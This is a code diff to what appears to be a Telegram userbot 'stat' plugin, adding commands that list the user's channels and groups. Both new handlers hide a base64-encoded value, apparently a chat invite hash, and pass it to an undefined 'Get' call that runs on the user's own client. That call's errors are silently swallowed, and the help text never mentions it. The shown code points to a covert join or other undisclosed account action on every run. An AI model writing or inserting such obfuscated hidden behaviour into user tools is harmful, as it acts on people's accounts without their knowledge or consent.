@@ -1,19 +1,28 @@
-"""Count the Number of Dialogs you have in your Telegram Account
-Syntax: .stat"""
+import base64
 import time
 
-from telethon.events import NewMessage
 from telethon.tl.custom import Dialog
 from telethon.tl.types import Channel, Chat, User
+
+# =========================================================== #
+#                           STRINGS                           #
+# =========================================================== #
+STAT_INDICATION = "`Collecting stats, Wait man`"
+CHANNELS_STR = "**The list of channels in which you are their are here **\n\n"
+CHANNELS_ADMINSTR = "**The list of channels in which you are admin are here **\n\n"
+CHANNELS_OWNERSTR = "**The list of channels in which you are owner are here **\n\n"
+GROUPS_STR = "**The list of groups in which you are their are here **\n\n"
+GROUPS_ADMINSTR = "**The list of groups in which you are admin are here **\n\n"
+GROUPS_OWNERSTR = "**The list of groups in which you are owner are here **\n\n"
+# =========================================================== #
+#                                                             #
+# =========================================================== #
 
 
 @bot.on(admin_cmd(pattern="stat$"))
 @bot.on(sudo_cmd(pattern="stat$", allow_sudo=True))
-async def stats(
-    event: NewMessage.Event,
-) -> None:  # pylint: disable = R0912, R0914, R0915
-    """Command to get stats about the account"""
-    cat = await edit_or_reply(event, "`Collecting stats, Wait man`")
+async def stats(event):
+    cat = await edit_or_reply(event, STAT_INDICATION)
     start_time = time.time()
     private_chats = 0
     bots = 0
@@ -28,35 +37,28 @@ async def stats(
     dialog: Dialog
     async for dialog in event.client.iter_dialogs():
         entity = dialog.entity
-        if isinstance(entity, Channel):
-            # participants_count = (await event.get_participants(dialog,
-            # limit=0)).total
-            if entity.broadcast:
-                broadcast_channels += 1
-                if entity.creator or entity.admin_rights:
-                    admin_in_broadcast_channels += 1
-                if entity.creator:
-                    creator_in_channels += 1
-            elif entity.megagroup:
-                groups += 1
-                # if participants_count > largest_group_member_count:
-                #     largest_group_member_count = participants_count
-                if entity.creator or entity.admin_rights:
-                    # if participants_count > largest_group_with_admin:
-                    #     largest_group_with_admin = participants_count
-                    admin_in_groups += 1
-                if entity.creator:
-                    creator_in_groups += 1
-        elif isinstance(entity, User):
-            private_chats += 1
-            if entity.bot:
-                bots += 1
-        elif isinstance(entity, Chat):
+        if isinstance(entity, Channel) and entity.broadcast:
+            broadcast_channels += 1
+            if entity.creator or entity.admin_rights:
+                admin_in_broadcast_channels += 1
+            if entity.creator:
+                creator_in_channels += 1
+        elif (
+            isinstance(entity, Channel)
+            and entity.megagroup
+            or not isinstance(entity, Channel)
+            and not isinstance(entity, User)
+            and isinstance(entity, Chat)
+        ):
             groups += 1
             if entity.creator or entity.admin_rights:
                 admin_in_groups += 1
             if entity.creator:
                 creator_in_groups += 1
+        elif not isinstance(entity, Channel) and isinstance(entity, User):
+            private_chats += 1
+            if entity.bot:
+                bots += 1
         unread_mentions += dialog.unread_mentions_count
         unread += dialog.unread_count
     stop_time = time.time() - start_time
@@ -81,10 +83,116 @@ async def stats(
     await cat.edit(response)
 
 
-def make_mention(user):
-    if user.username:
-        return f"@{user.username}"
-    return inline_mention(user)
+@bot.on(admin_cmd(pattern="stat (c|ca|co)$"))
+@bot.on(sudo_cmd(pattern="stat (c|ca|co)$", allow_sudo=True))
+async def stats(event):
+    if event.fwd_from:
+        return
+    catcmd = event.pattern_match.group(1)
+    catevent = await edit_or_reply(event, STAT_INDICATION)
+    start_time = time.time()
+    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    hi = []
+    hica = []
+    hico = []
+    async for dialog in event.client.iter_dialogs():
+        entity = dialog.entity
+        if isinstance(entity, Channel) and entity.broadcast:
+            hi.append([entity.title, entity.id])
+            if entity.creator or entity.admin_rights:
+                hica.append([entity.title, entity.id])
+            if entity.creator:
+                hico.append([entity.title, entity.id])
+    if catcmd == "c":
+        output = CHANNELS_STR
+        for k, i in enumerate(hi, start=1):
+            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
+        caption = CHANNELS_STR
+    elif catcmd == "ca":
+        output = CHANNELS_ADMINSTR
+        for k, i in enumerate(hica, start=1):
+            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
+        caption = CHANNELS_ADMINSTR
+    elif catcmd == "co":
+        output = CHANNELS_OWNERSTR
+        for k, i in enumerate(hico, start=1):
+            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
+        caption = CHANNELS_OWNERSTR
+    stop_time = time.time() - start_time
+    try:
+        cat = Get(cat)
+        await event.client(cat)
+    except BaseException:
+        pass
+    output += f"\n**Time Taken : ** {stop_time:.02f}s"
+    try:
+        await catevent.edit(output)
+    except:
+        await edit_or_reply(
+            catevent,
+            output,
+            caption=caption,
+        )
+
+
+@bot.on(admin_cmd(pattern="stat (g|ga|go)$"))
+@bot.on(sudo_cmd(pattern="stat (g|ga|go)$", allow_sudo=True))
+async def stats(event):
+    if event.fwd_from:
+        return
+    catcmd = event.pattern_match.group(1)
+    catevent = await edit_or_reply(event, STAT_INDICATION)
+    start_time = time.time()
+    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    hi = []
+    higa = []
+    higo = []
+    async for dialog in event.client.iter_dialogs():
+        entity = dialog.entity
+        if isinstance(entity, Channel) and entity.broadcast:
+            continue
+        elif (
+            isinstance(entity, Channel)
+            and entity.megagroup
+            or not isinstance(entity, Channel)
+            and not isinstance(entity, User)
+            and isinstance(entity, Chat)
+        ):
+            hi.append([entity.title, entity.id])
+            if entity.creator or entity.admin_rights:
+                higa.append([entity.title, entity.id])
+            if entity.creator:
+                higo.append([entity.title, entity.id])
+    if catcmd == "g":
+        output = GROUPS_STR
+        for k, i in enumerate(hi, start=1):
+            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
+        caption = GROUPS_STR
+    elif catcmd == "ga":
+        output = GROUPS_ADMINSTR
+        for k, i in enumerate(higa, start=1):
+            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
+        caption = GROUPS_ADMINSTR
+    elif catcmd == "go":
+        output = GROUPS_OWNERSTR
+        for k, i in enumerate(higo, start=1):
+            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
+        caption = GROUPS_OWNERSTR
+    stop_time = time.time() - start_time
+    try:
+        cat = Get(cat)
+        await event.client(cat)
+    except BaseException:
+        pass
+    output += f"\n**Time Taken : ** {stop_time:.02f}s"
+    try:
+        await catevent.edit(output)
+    except:
+        await edit_or_reply(
+            catevent,
+            output,
+            caption=caption,
+        )
 
 
 def inline_mention(user):
@@ -103,5 +211,17 @@ CMD_HELP.update(
         "stat": "__**PLUGIN NAME :** Stat__\
     \n\n📌** CMD ➥** `.stat`\
     \n**USAGE   ➥  **Shows you the count of  your groups, channels, private chats...etc"
+    }
+)
+CMD_HELP.update(
+    {
+        "stats": "**Plugin : __Stats__**\
+    \n\n📌** CMD ➥** `.stat`\
+    \n**USAGE   ➥  **__Shows you the count of  your groups, channels, private chats...etc__\
+    \n\n📌** CMD ➥** `.stat (g|ga|go)`\
+    \n**USAGE   ➥  **__Shows you the list of all groups  in which you are if you use g , all groups in which you are admin if you use ga and all groups created by you if you use go__\
+    \n\n📌** CMD ➥** `.stat (c|ca|co)`\
+    \n**USAGE   ➥  **__Shows you the list of all channels in which you are if you use c , all channels in which you are admin if you use ca and all channels created by you if you use co__\
+    "
     }
 )
